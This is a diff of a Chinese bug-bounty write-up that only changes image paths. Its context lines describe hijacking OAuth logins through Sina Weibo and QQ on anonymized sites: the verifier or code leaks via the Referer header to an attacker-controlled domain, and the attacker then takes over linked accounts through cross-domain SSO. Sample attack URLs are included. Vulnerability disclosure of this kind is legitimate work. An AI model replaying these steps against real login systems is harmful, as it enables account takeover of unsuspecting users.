@@ -10,12 +10,12 @@ tags: [bounty]
 
 
 首先我在`http://bbs.AAA.com/thread-19478133-14-1.html`帖子插入了外链图片
-![5.png](C:\Users\todaro\Desktop\2018.1.20\5.png)
+![5.png](img/article/2018.1.20/5.png)
 
 #### 【1】新浪微博授权劫持
 
 测试账户绑定新浪微博“不止步的todaro”,该用户可通过新浪微博快速登录其绑定的AAA账户
-![6.png](C:\Users\todaro\Desktop\2018.1.20\6.png)
+![6.png](img/article/2018.1.20/6.png)
 在账号和新浪微博已经绑定的情况下点击
 `https://account.AAA.com/sina.php?to=http://i.AAA.com/`
 可以直接跳转到账户，不用再点击一次头像
@@ -36,7 +36,7 @@ http://api.t.sina.com.cn/oauth/authorize?oauth_token=43544e7c96e437852021d6c5a24
 ```
 
 用户请求后，直接通过referer泄露了另外一个授权要用到的参数`oauth_verifier`的值
-![7.png](C:\Users\todaro\Desktop\2018.1.20\7.png)
+![7.png](img/article/2018.1.20/7.png)
 Referer:
 ```
 http://bbs.AAA.com/thread-19478133-14-1.html?oauth_token=43544e7c96e437852021d6c5a2415f1c&oauth_verifier=620201
@@ -48,7 +48,7 @@ http://account.AAA.com/sinalogin.php?oauth_token=43544e7c96e437852021d6c5a2415f1
 ```
 
 黑客成功在自己浏览器中登录该新浪微博绑定的账户
-![8.png](C:\Users\todaro\Desktop\2018.1.20\8.png)
+![8.png](img/article/2018.1.20/8.png)
 在AAA.com登录，也意味着该账号对应绑定的邮箱也登录了BBB.com，因为他们设置了跨域账户互通
 
 但是默认情况下只有用户通过直接post请求登录AAA.com才会触发登陆BBB.com
@@ -68,11 +68,11 @@ https://passport.BBB.com/ssoLogin?st=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aW
 有了这个请求之后，passport.BBB.com也就登录成功了
 
 所以黑客授权劫持后，试着请求一下，最后成功登录其BBB.com的账户
-![9.png](C:\Users\todaro\Desktop\2018.1.20\9.png)
+![9.png](img/article/2018.1.20/9.png)
 黑客访问
 `https://passport.BBB.com`
 成功
-![10.png](C:\Users\todaro\Desktop\2018.1.20\10.png)
+![10.png](img/article/2018.1.20/10.png)
 至此完成了对新浪授权登录账户的劫持，新浪用户只需要第一次授权要点确定，后面直接授权，无需任何操作，对用户来说是完全无感的。
 
 #### 【2】新浪微博劫持
@@ -85,7 +85,7 @@ https://graph.qq.com/oauth2.0/show?which=Login&display=pc&response_type=code&cli
 ```
 
 这里每次的`state`参数同上面的`oauth_token`一样都是变化的，所以黑客需要先在自己的浏览器访问获取改值
-![11.jpg](C:\Users\todaro\Desktop\2018.1.20\11.jpg)
+![11.jpg](img/article/2018.1.20/11.jpg)
 ```
 https://graph.qq.com/oauth2.0/show?which=Login&display=pc&response_type=code&client_id=XXXXXX&redirect_uri=http://account.AAA.com/qqlogin.php&state=7fd233c9f34a007745e2773755121b53&scope=get_user_info
 ```
@@ -95,7 +95,7 @@ https://graph.qq.com/oauth2.0/show?which=Login&display=pc&response_type=code&cli
 https://graph.qq.com/oauth2.0/show?which=Login&display=pc&response_type=code&client_id=XXXXXX&redirect_uri=http://bbs.AAA.com/thread-19478133-14-1.html&state=7fd233c9f34a007745e2773755121b53&scope=get_user_info
 ```
 获得
-![12.png](C:\Users\todaro\Desktop\2018.1.20\12.png)
+![12.png](img/article/2018.1.20/12.png)
 Referer:
 ```
 http://bbs.AAA.com/thread-19478133-14-1.html?code=C35B9259FB0E81135F126AFA50FC967B&state=7fd233c9f34a007745e2773755121b53
@@ -107,7 +107,7 @@ http://account.AAA.com/qqlogin.php?code=C35B9259FB0E81135F126AFA50FC967B&state=7
 ```
 
 黑客成功登录用户账户
-![13.png](C:\Users\todaro\Desktop\2018.1.20\8.png)
+![13.png](img/article/2018.1.20/8.png)
 黑客随后请求
 ```
 http://account.AAA.com/?p=login_success&error=0&message=&next=http%3A%2F%2Fi.AAA.com&secure=1&from=login&nerror=
@@ -115,7 +115,7 @@ http://account.AAA.com/?p=login_success&error=0&message=&next=http%3A%2F%2Fi.AAA
 黑客接着请求`https://passport.BBB.com`
 
 黑客成功登录其BBB.com账户
-![14.png](C:\Users\todaro\Desktop\2018.1.20\10.png)
+![14.png](img/article/2018.1.20/10.png)
 至此完成了对qq授权登录账户的劫持，qq授权每次都是要点击头像授权的，所以它不像新浪那么方便。
 
 #### 【3】当授权返回地址限制到特定域名但是没有限制到特定目录时还是会出问题
@@ -193,16 +193,16 @@ http://api.t.sina.com.cn/oauth/authorize?oauth_token=7d5484c0f195334471a44b04ff5
 所以一切都通了。
 
 黑客先在自己的浏览器访问`https://account.AAA.com/`
-![13.png](C:\Users\todaro\Desktop\2018.1.20\13.png)
+![13.png](img/article/2018.1.20/13.png)
 点击该按钮，获取到url中的`oauth_token`
-![14.png](C:\Users\todaro\Desktop\2018.1.20\14.png)
+![14.png](img/article/2018.1.20/14.png)
 `oauth_token=0645156deaa21088d5211897ab5fd332`
 
 替换到下面的链接中，受害者访问如下链接
 ```
 http://api.t.sina.com.cn/oauth/authorize?oauth_token=0645156deaa21088d5211897ab5fd332&oauth_callback=https://account.AAA.com/?next=https://i.AAA.com.itodaro.pw%26p=login_success
 ```
-![15.png](C:\Users\todaro\Desktop\2018.1.20\15.png)
+![15.png](img/article/2018.1.20/15.png)
 黑客成功获取到referer数据
 
 Referer:
@@ -214,7 +214,7 @@ http://account.AAA.com/?next=https://i.AAA.com.cp.win&p=login_success&oauth_toke
 http://account.AAA.com/sinalogin.php?oauth_token=0645156deaa21088d5211897ab5fd332&oauth_verifier=235790
 ```
 黑客成功登录受害者对应账号
-![16.png](C:\Users\todaro\Desktop\2018.1.20\8.png)
+![16.png](img/article/2018.1.20/8.png)
 黑客接着请求
 ```
 http://account.AAA.com/?p=login_success&error=0&message=&next=http%3A%2F%2Fi.AAA.com&secure=1&from=login&nerror=
@@ -222,7 +222,7 @@ http://account.AAA.com/?p=login_success&error=0&message=&next=http%3A%2F%2Fi.AAA
 黑客接着请求`https://passport.BBB.com`
 
 黑客成功登录BBB.com的账户
-![17.png](C:\Users\todaro\Desktop\2018.1.20\10.png)
+![17.png](img/article/2018.1.20/10.png)
 至此完成了对qq授权登录账户的劫持，qq授权每次都是要点击头像授权
 
 #### 【4】修复建议
